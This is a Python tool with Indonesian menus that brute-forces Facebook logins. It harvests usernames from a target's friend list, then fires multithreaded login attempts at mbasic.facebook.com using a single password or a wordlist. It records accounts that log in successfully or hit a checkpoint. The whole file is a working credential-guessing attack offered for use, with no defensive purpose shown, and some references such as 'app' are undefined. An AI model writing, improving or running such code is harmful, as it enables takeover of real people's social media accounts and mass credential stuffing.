#-*- coding:utf-8 -*-
import os
import re
import sys
import time
import threading
import jjk
while True:
    try:
        import otewe
        import requests
        break
    except ImportError:
        print('\nOTW boss....\n')
        time.sleep(2)
        os.system('{} -m pip install -r {}{}'.format(sys.executable, os.path.dirname(os.path.realpath(__file__)), '/requirements.txt'))

try:
    from queue import Queue
except ImportError:
    from Queue import Queue


class attack(threading.Thread):
    def __init__(self, queue_data):
        super(attack, self).__init__()

        self.queue_data = queue_data
        self.requests = requests
        self.daemon = True

        self.facebook_signin = 'https://mbasic.facebook.com/login/device-based/regular/login/'
        self.facebook_signin2 = 'https://mbasic.facebook.com/login.php'

    def run(self):
        while True:
            username, password = self.queue_data.get()
            self.signin(username, password)
            self.queue_data.task_done()

    def signin(self, username, password):
        global success, checkpoint, failed
        while True:
            try:
                response = self.requests.request('post', self.facebook_signin, data={'email': username, 'pass': password, 'login': 'Log In'}, headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}, timeout=20)
                if '/home.php' in response.url:
                    success.append('{} [{}]'.format(username, password))
                    app.lol('[G1]{} [G2]{}'.format(username, password))
                elif '/checkpoint' in response.url:
                    checkpoint.append('{} [{}]'.format(username, password))
                    app.lol('[Y1]{} [Y2]{}'.format(username, password))
                else:
                    failed.append('{} [{}]'.format(username, password))
                    app.lol('[R1]{} [R2]{}'.format(username, password))
                break
            except requests.exceptions.ConnectionError:
                app.lol('[P1]{} [P2]{}'.format(username, password))
            except requests.exceptions.Timeout:
                app.lol('[P1]{} [P2]{}'.format(username, password))
            except Exception as exception:
                app.lol(exception)
                break

facebook = app.facebook(freemode=False)

def facebook_signin():
    if facebook.authenticated == True:
        app.lol('[C1].... \n')
        return
    app.lol('>[B2]login facebook')
    app.lol('>[R1]enter untuk batal')
    username = app.str_input('Username', validate=False)
    if not username:
        app.lol('\n[R1]Batal\n')
        time.sleep(1)
        os.system('clear')
        return
    password = app.str_input('Password', validate=False, enter=True)
    if not password:
        app.lol('[R1]gagal\n')
        time.sleep(2)
        os.system('clear')
        return
    facebook.signin(username, password)

def facebook_take_users_from_user_friend_list():
    while True:
        if facebook.authenticated == False:
            app.lol('[R1]>Uppps....Login dulu gans!!\n')
            time.sleep(2)
            os.system('clear')
            break
        app.lol('>masukkan nama pengguna target/teman untuk dikumpulkan')
        username = app.str_input('nama pengguna', validate=False, enter=True)
        if username:
            result = facebook.take_users_from_friend_list(username)        
            if result:
                facebook.save_users()
        else: break

success, checkpoint, failed, total = [], [], [], 0

def facebook_attack_result():
    app.lol('\n[G1]Berhasil {} [Y1]Checkpoint {} [R1]Gagal {} [C1]Dipindai {} [P1]Total {}\n'.format(len(success), len(checkpoint), len(failed), len(success)+len(checkpoint)+len(failed),total))
    time.sleep(3)
def facebook_attack(manual=True, threads=20):
    global total
    while True:
        queue_data = Queue()
        passwords = []
        try:
            file_users = list(filter(None, open(os.path.dirname(os.path.abspath(__file__))+'/txt/users.txt', 'r').read().splitlines()))
            file_users_all = list(filter(None, open(os.path.dirname(os.path.abspath(__file__))+'/txt/users-all.txt', 'r').read().splitlines()))
            file_users_temp = list(filter(None, open(os.path.dirname(os.path.abspath(__file__))+'/txt/users-temp.txt', 'r').read().splitlines()))
            app.lol('[Y1]===============================\\===')
            app.lol('1. data diambil                    {}'.format(len(file_users)))
            app.lol('2. semua data tersimpan            {}'.format(len(file_users_all)))
            app.lol('[G1]3. hapus data')
            app.lol('[R1]0. Kembali\n')
            choice = app.opt_input('?>', ['1','2','3','0'], enter=True)
            if choice == '0':
                app.lol('[R1]oke..\n')
                time.sleep(1)
                os.system('clear')
                return
            elif choice == '1':
                users = file_users
            elif choice == '2':
                users = file_users_all
            elif choice == '3':
                open('txt/users.txt','w').close()
                open('txt/users-all.txt','w').close()
                lol('[R2]sukses menghapus !');time.sleep(1)
                os.system('clear')
                return
        except Exception as exception:
            app.lol('[R1]Upps..!! ambil UserName dulu!\n')
            time.sleep(2)
            os.system('clear')
            return
        if manual == True:
            app.lol('>masukkan password untuk crak semua user')
            app.lol('>enter untuk kembali')
            password = app.str_input('Passsword', validate=False, enter=True)
            if not password:
                app.lol('[R1]oke\n')
                time.sleep(1)
                os.system('clear')
                return
            passwords.append(password)
        else:
            while True:
                try:
                    app.lol('>Masukkan wordlist / enter untuk batal')
                    app.lol('>wordlist bawaan ketik pw.txt')
                    wordlist = app.str_input('Wordlist', validate=False, enter=True)
                    if not wordlist:
                        app.lol('[R1]Dibatalkan!\n')
                        os.system('clear')
                        return
                    passwords = list(filter(None, open(wordlist, 'r').read().splitlines()))
                    break
                except Exception as exception:
                    app.lol('[R1]>File tidak ditemukan\n')
        for password in passwords:
            for user in users:
                username = user.split(' - ')[0]
                if username:
                    queue_data.put((username, password))
        app.lol('[G1]>Usernames                         [Y1]{}'.format(len(users)))
        app.lol('[G1]>Passwords                         [Y1]{}'.format(len(passwords)))
        app.lol('[G1]>Total                             [Y1]{}\n'.format(queue_data.qsize()))
        choice = app.opt_input('>Lanjut? y/n', ['y','n','c'], enter=True)
        total = queue_data.qsize()
        if choice == 'y':
            break
        if choice == 'n':
            return
    app.lol('[G1]berhasil [Y1]Checkpoint [R1]Gagal [P1]Koneksi Error\n')
    for i in range(threads):
        attack(queue_data).start()
    while True:
        try:
            queue_data.join()
            facebook_attack_result()
            success, checkpoint, failed = [], [], []
            break
        except KeyboardInterrupt:
            with threading.RLock():
                facebook_attack_result()
                success, checkpoint, failed = [], [], []
                app.exit()

def main():
    while True:
        app.lol('''[Y2]
      __
    / /  \            .
   /      \           .
  |        )          .
  |       /           .
   \_/\__/\           .
     \     \          .
      \     \         .
       \     \        .
        \     \       .
        /      |      .
       /       \      .
      /    /    \     .
     /    |      |
    |     |      |
    |      \     /
     \____/ `---'[B1]by_mbest[Y2]''')
        app.lol('')
        app.lol('[Y1]══════════════\═')
        app.lol('''[G2]1. Login
[G2]2. Ambil Nama Pengguna/teman/teman dari teman
[G2]3. Crack dari data yang terambil
[G2]4. Crack pake wordlist''')
        app.lol('[R1]0.[R2] Exit')
        app.lol()
        result = app.opt_input('?>', ['1','2','3','4','0'], enter=True)
        if result == '0':
            app.exit(confirm=False)
        elif result == '1':
            facebook_signin()
        elif result == '2':
            facebook_take_users_from_user_friend_list()
        elif result == '3':
            os.system('clear')
            facebook_attack(manual=True)
        elif result == '4':
            facebook_attack(manual=False)

if __name__=='__main__':
    main()
